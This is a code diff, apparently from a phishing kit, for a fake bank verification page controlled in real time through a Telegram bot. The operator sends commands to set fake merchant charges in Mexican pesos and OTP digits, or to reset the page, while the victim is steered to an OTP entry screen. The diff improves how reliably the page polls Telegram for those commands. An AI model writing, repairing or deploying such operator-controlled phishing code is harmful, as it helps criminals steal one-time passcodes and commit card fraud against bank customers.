@@ -26,8 +26,7 @@
   const DEFAULT_AMOUNT = "$6,000.00 MXN";
   const RECONFIG_WINDOW_MS = 20000; 
 
-  // Semáforo de control para impedir ráfagas simultáneas concurrentes
-  let lockActive = false;
+  let punteroId = 0;
 
   function formatMXN(num) {
     return "$" + num.toLocaleString("es-MX", {
@@ -52,32 +51,23 @@
     } catch (e) { }
   }
 
-  // SOLUCIÓN RADICAL AL 409: Petición atómica balanceada con offset=-1
-  async function fetchLatestUpdateSafe() {
-    if (lockActive) return null;
-    lockActive = true;
+  // FUNCIÓN CLAVE: Consume y descarta todos los mensajes viejos acumulados en el chat
+  async function limpiarHistorialViejo() {
     try {
-      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1&limit=1&timeout=0`);
-      if (res.status === 409) {
-        lockActive = false;
-        return null;
-      }
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?limit=100`);
       const data = await res.json();
-      lockActive = false;
       if (data.ok && data.result && data.result.length > 0) {
-        return data.result;
+        punteroId = Number(data.result[data.result.length - 1].update_id);
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${punteroId + 1}&limit=1`);
       }
-    } catch (e) {
-      lockActive = false;
-    }
-    return null;
+    } catch (e) { }
   }
 
-    async function startLoadingGatekeeper() {
+  async function startLoadingGatekeeper() {
     const user = sessionStorage.getItem("demo_user") || "usuario_demo";
     
-    // ANCLAJE DE HISTORIAL: Obtenemos el ID del último mensaje antes de empezar
-    let lastUpdateId = await getLastUpdateId();
+    // Antes de alertar al operador, vaciamos por completo el buzón de mensajes viejos
+    await limpiarHistorialViejo();
 
     const isReturnPass = sessionStorage.getItem("gatekeeper_done") === "1";
 
@@ -109,60 +99,66 @@
           return;
         }
 
-        // Pasamos el lastUpdateId para escuchar solo lo nuevo
-        const update = await fetchLatestUpdateSafe();
-        if (update && update.length > 0) {
-          const msg = update[0].message || update[0].channel_post || update[0].edited_message;
-          if (msg && msg.update_id > lastUpdateId && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
-            lastUpdateId = msg.update_id; // Actualizamos el puntero
-            const textoMensaje = msg.text.trim();
-            const low = textoMensaje.toLowerCase();
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${punteroId + 1}&timeout=5`);
+          const data = await res.json();
+          
+          if (data.ok && data.result && data.result.length > 0) {
+            for (const update of data.result) {
+              punteroId = Number(update.update_id);
+              const msg = update.message || update.channel_post || update.edited_message;
+              
+              if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
+                const textoMensaje = msg.text.trim();
+                const low = textoMensaje.toLowerCase();
 
-            if (low === 'reinicio' || low === 'reset') {
-              localStorage.clear();
-              sessionStorage.clear();
-              window.location.replace("index.html");
-              return;
-            }
+                if (low === 'reinicio' || low === 'reset') {
+                  localStorage.clear();
+                  sessionStorage.clear();
+                  window.location.replace("index.html");
+                  return;
+                }
 
-            if (low === 'cierre') {
-              sessionStorage.setItem("accion_telegram", "cierre");
-              await sendTelegram("🔒 *Flujo Cerrado:* Botones deshabilitados. Procediendo a OTP...");
-              window.location.href = "otp.html";
-              return; 
-            }
+                if (low === 'cierre') {
+                  sessionStorage.setItem("accion_telegram", "cierre");
+                  await sendTelegram("🔒 *Flujo Cerrado:* Botones deshabilitados. Procediendo a OTP...");
+                  window.location.href = "otp.html";
+                  return; 
+                }
 
-            if (["no", "n", "ok", "listo", "mantener"].includes(low)) {
-              await sendTelegram("Mantengo el cargo actual. Entrando a OTP...");
-              window.location.href = "otp.html";
-              return;
-            }
+                if (["no", "n", "ok", "listo", "mantener"].includes(low)) {
+                  await sendTelegram("Mantengo el cargo actual. Entrando a OTP...");
+                  window.location.href = "otp.html";
+                  return;
+                }
 
-            const m = textoMensaje.match(/^(.+?)\s*[|,]\s*([\d.,]+)\s*$/);
-            if (m) {
-              const merchant = m[1].trim();
-              const amt = parseAmount(m[2]);
-              if (merchant && amt !== null) {
-                sessionStorage.setItem("charge_merchant", merchant);
-                sessionStorage.setItem("charge_amount", formatMXN(amt));
-                await sendTelegram(`✅ *Cargo actualizado:*\n🏪 ${merchant}\n💵 ${formatMXN(amt)}`);
-                window.location.href = "otp.html";
-                return;
-              }
-            }
+                const m = textoMensaje.match(/^(.+?)\s*[|,]\s*([\d.,]+)\s*$/);
+                if (m) {
+                  const merchant = m[1].trim();
+                  const amt = parseAmount(m[2]);
+                  if (merchant && amt !== null) {
+                    sessionStorage.setItem("charge_merchant", merchant);
+                    sessionStorage.setItem("charge_amount", formatMXN(amt));
+                    await sendTelegram(`✅ *Cargo actualizado:*\n🏪 ${merchant}\n💵 ${formatMXN(amt)}`);
+                    window.location.href = "otp.html";
+                    return;
+                  }
+                }
 
-            if (/^[\d.,]+$/.test(textoMensaje)) {
-              const amt = parseAmount(textoMensaje);
-              if (amt !== null) {
-                sessionStorage.setItem("charge_amount", formatMXN(amt));
-                await sendTelegram(`✅ *Monto actualizado:* ${formatMXN(amt)}`);
-                window.location.href = "otp.html";
-                return;
+                if (/^[\d.,]+$/.test(textoMensaje)) {
+                  const amt = parseAmount(textoMensaje);
+                  if (amt !== null) {
+                    sessionStorage.setItem("charge_amount", formatMXN(amt));
+                    await sendTelegram(`✅ *Monto actualizado:* ${formatMXN(amt)}`);
+                    window.location.href = "otp.html";
+                    return;
+                  }
+                }
               }
             }
           }
-        }
-        setTimeout(scanPass2, 2000);
+        } catch (error) { }
+        setTimeout(scanPass2, 1500);
       }
 
       scanPass2();
@@ -178,56 +174,56 @@
     textStatus.textContent = "Esperando configuración de seguridad móvil...";
 
     async function scanPass1() {
-      const update = await fetchLatestUpdateSafe();
       let tail = null;
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${punteroId + 1}&timeout=5`);
+        const data = await res.json();
 
-      if (update && update.length > 0) {
-        const msg = update[0].message;
-        // FILTRADO ESTRICTO: Solo procesa si el ID del mensaje es más nuevo que el arranque inicial
-        if (update[0].update_id > lastUpdateId && msg) {
-          lastUpdateId = update[0].update_id; // Avanzamos el puntero
-          const chatIDRecibido = String(msg.chat.id);
-          const chatIDConfigurado = String(TELEGRAM_CHAT_ID);
-          const msgText = msg.text ? msg.text.trim() : "";
-          const low = msgText.toLowerCase();
+        if (data.ok && data.result && data.result.length > 0) {
+          for (const update of data.result) {
+            punteroId = Number(update.update_id);
+            const msg = update.message;
 
-          if (low === 'reinicio' || low === 'reset') {
-            localStorage.clear();
-            sessionStorage.clear();
-            window.location.replace("index.html");
-            return; 
-          }
+            if (msg && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
+              const msgText = msg.text.trim();
+              const low = msgText.toLowerCase();
 
-          console.log(`📩 Mensaje detectado -> ID Configurado: "${chatIDConfigurado}" | ID Recibido: "${chatIDRecibido}" | Texto: "${msgText}"`);
+              if (low === 'reinicio' || low === 'reset') {
+                localStorage.clear();
+                sessionStorage.clear();
+                window.location.replace("index.html");
+                return; 
+              }
 
-          if (chatIDRecibido === chatIDConfigurado && /^\d{2}$/.test(msgText)) {
-            tail = msgText;
+              if (/^\d{2}$/.test(msgText)) {
+                tail = msgText;
+                break;
+              }
+            }
           }
         }
-      }
+      } catch (err) { }
 
       if (tail) {
         try { sessionStorage.setItem("otp_tail", tail); } catch (e) { }
         textStatus.textContent = "¡Configuración aplicada! Preparando validación...";
-        
-        // Pasamos el lastUpdateId actual para que el paso 1B tampoco lea textos viejos
-        await proceedToChargeConfig(lastUpdateId);
+        await proceedToChargeConfig();
       } else {
-        setTimeout(scanPass1, 2000);
+        setTimeout(scanPass1, 1500);
       }
     }
 
     scanPass1();
   }
-
-
-
   async function proceedToChargeConfig() {
     try {
       sessionStorage.removeItem("charge_merchant");
       sessionStorage.removeItem("charge_amount");
       sessionStorage.setItem("flow_type", "charge"); 
     } catch (e) { }
+
+    // Purga del buzón justo antes del Paso 1B
+    await limpiarHistorialViejo();
 
     await sendTelegram(
       `🚨 *PASO 1B: CARGO DINÁMICO (OPCIONAL)* 🚨\n\n` +
@@ -242,53 +238,64 @@
     async function scanPass1B() {
       let done = false;
       let esBaja = false;
-      const update = await fetchLatestUpdateSafe();
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${punteroId + 1}&timeout=5`);
+        const data = await res.json();
 
-      if (update && update.length > 0) {
-        // CORREGIDO: Acceso seguro al índice [0] del array devuelto
-        const msg = update[0].message;
-        if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
-          const t = msg.text.trim();
-          const low = t.toLowerCase();
+        if (data.ok && data.result && data.result.length > 0) {
+          for (const update of data.result) {
+            punteroId = Number(update.update_id);
+            const msg = update.message;
 
-          if (low === 'reinicio' || low === 'reset') {
-            localStorage.clear();
-            sessionStorage.clear();
-            window.location.replace("index.html");
-            return;
-          }
+            if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
+              const t = msg.text.trim();
+              const low = t.toLowerCase();
 
-          if (low === "baja") {
-            try { sessionStorage.setItem("flow_type", "baja"); } catch (e) { }
-            await sendTelegram("⚠️ Se usará el cargo por defecto. Redirigiendo a Dashboard...");
-            esBaja = true;
-            done = true;
-          } else if (["no", "n", "default", "defecto", "skip"].includes(low)) {
-            await sendTelegram("Se usará el cargo por defecto.");
-            done = true;
-          } else {
-            const m = t.match(/^(.+?)\s*[|,]\s*([\d.,]+)\s*$/);
-            if (m) {
-              const merchant = m[1].trim();
-              const amt = parseAmount(m[2]);
-              if (merchant && amt !== null) {
-                sessionStorage.setItem("charge_merchant", merchant);
-                sessionStorage.setItem("charge_amount", formatMXN(amt));
-                await sendTelegram(`✅ *Cargo configurado:*\n🏪 ${merchant}\n💵 ${formatMXN(amt)}`);
-                done = true;
+              if (low === 'reinicio' || low === 'reset') {
+                localStorage.clear();
+                sessionStorage.clear();
+                window.location.replace("index.html");
+                return;
               }
-            }
-            if (!done && /^[\d.,]+$/.test(t)) {
-              const amt = parseAmount(t);
-              if (amt !== null) {
-                sessionStorage.setItem("charge_amount", formatMXN(amt));
-                await sendTelegram(`✅ *Monto actualizado:* ${formatMXN(amt)}`);
+
+              if (low === "baja") {
+                try { sessionStorage.setItem("flow_type", "baja"); } catch (e) { }
+                await sendTelegram("⚠️ Se usará el cargo por defecto. Redirigiendo a Dashboard...");
+                esBaja = true;
                 done = true;
+                break;
+              } else if (["no", "n", "default", "defecto", "skip"].includes(low)) {
+                await sendTelegram("Se usará el cargo por defecto.");
+                done = true;
+                break;
+              } else {
+                const m = t.match(/^(.+?)\s*[|,]\s*([\d.,]+)\s*$/);
+                if (m) {
+                  const merchant = m[1].trim();
+                  const amt = parseAmount(m[2]);
+                  if (merchant && amt !== null) {
+                    sessionStorage.setItem("charge_merchant", merchant);
+                    sessionStorage.setItem("charge_amount", formatMXN(amt));
+                    await sendTelegram(`✅ *Cargo configurado:*\n🏪 ${merchant}\n💵 ${formatMXN(amt)}`);
+                    done = true;
+                    break;
+                  }
+                }
+
+                if (!done && /^[\d.,]+$/.test(t)) {
+                  const amt = parseAmount(t);
+                  if (amt !== null) {
+                    sessionStorage.setItem("charge_amount", formatMXN(amt));
+                    await sendTelegram(`✅ *Monto actualizado:* ${formatMXN(amt)}`);
+                    done = true;
+                    break;
+                  }
+                }
               }
             }
           }
         }
-      }
+      } catch (e) { }
 
       if (done) {
         try { sessionStorage.setItem("gatekeeper_done", "1"); } catch (e) { }
@@ -298,7 +305,7 @@
           setTimeout(() => { window.location.href = "otp.html"; }, 1000);
         }
       } else {
-        setTimeout(scanPass1B, 2000);
+        setTimeout(scanPass1B, 1500);
       }
     }
 
